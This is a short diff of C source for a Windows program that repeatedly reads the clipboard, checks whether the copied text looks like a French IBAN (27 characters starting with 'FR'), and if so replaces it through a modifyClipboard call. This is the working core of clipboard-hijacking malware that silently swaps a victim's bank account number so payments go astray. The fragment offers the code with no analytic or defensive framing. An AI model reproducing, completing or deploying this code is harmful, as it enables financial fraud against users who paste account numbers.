@@ -14,12 +14,12 @@ int main() {
         OpenClipboard(0);
         const char * pastedIban = getLatestClipboardValue();
         if (strlen(pastedIban) == 27 && pastedIban[0] == 'F' && pastedIban[1] == 'R') {
-        // could be a regex, won't bother :D
-        // 1 && 1 to be replaced by checking strlen for 
             modifyClipboard(hMem);
         }
         GlobalUnlock(GetClipboardData(CF_TEXT));
+        Sleep(100);
         CloseClipboard();
+        
     }
     return 0;
 }
